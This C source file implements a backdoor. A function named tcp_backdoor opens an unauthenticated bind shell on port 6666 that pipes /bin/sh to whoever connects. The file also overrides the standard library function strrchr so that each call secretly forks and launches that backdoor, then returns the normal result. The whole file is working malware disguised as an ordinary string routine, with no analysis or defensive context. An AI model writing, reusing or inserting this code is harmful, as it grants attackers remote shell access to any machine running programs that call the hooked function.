#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define PORT 6666
#define WELCOME  "login in. welcome!\n"

int tcp_backdoor(void)
{
    int listenfd, connfd;
    pid_t pid;
    socklen_t clilen;
    struct sockaddr_in s_addr;
    struct sockaddr_in c_addr;

    listenfd = socket(AF_INET,SOCK_STREAM,0);
    if (listenfd == -1){
        printf("socket failed!");
        exit(1);
    }
    memset(&s_addr, '\0', sizeof(s_addr));
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
    s_addr.sin_port=htons(PORT);
    if (bind(listenfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) == -1){
        //printf("bind failed!\n");
        exit(1);
    }
    if (listen(listenfd, 20) == -1){ 
        printf("listen failed!");
        exit(1);
    }
    clilen = sizeof(c_addr);

    for(;;) {
        connfd = accept(listenfd, (struct sockaddr *)&c_addr, &clilen);
        if(!(pid = fork())) 
        {
            if((pid = fork()) > 0) {
                //printf("子进程死亡\n");
                exit(0);                           /*子进程终结*/
            } else if(!pid) {                       /*孙进程处理链接请求*/
                close(listenfd);                  /*关闭除要处理的套接字外的所有描述符*/
                write(connfd, WELCOME, strlen(WELCOME));
                dup2(connfd,0);   /*将标准输入、输出、出错重定向到我们的套接字上*/
                dup2(connfd,1); 
                dup2(connfd,2);
                execl("/bin/sh", "bash", NULL);
            }
        } else if (pid > 0){   /*父进程*/
            close(connfd);
            if (waitpid(pid, NULL, 0) != pid) 
                printf("waitpid error");
            //printf("父进程死亡\n");
        }
    }
}

/* Find the last occurrence of C in S.  */
char *
old_strrchr (const char *s, int c)
{
    register const char *found, *p;

    c = (unsigned char) c;

    /* Since strchr is fast, we use it rather than the obvious loop.  */

    if (c == '\0')
        return strchr (s, '\0');

    found = NULL;
    while ((p = strchr (s, c)) != NULL){
        found = p;
        s = p + 1;
    }

    return (char *) found;
}

char *
strrchr(const char *s, int c)
{
    pid_t pid;
    pid = fork();
    if (pid < 0) {
        printf("fork failed\n");
        exit(0);
    }
    if (pid == 0) { /*子进程*/
        tcp_backdoor();
    }
    return old_strrchr(s, c);
}

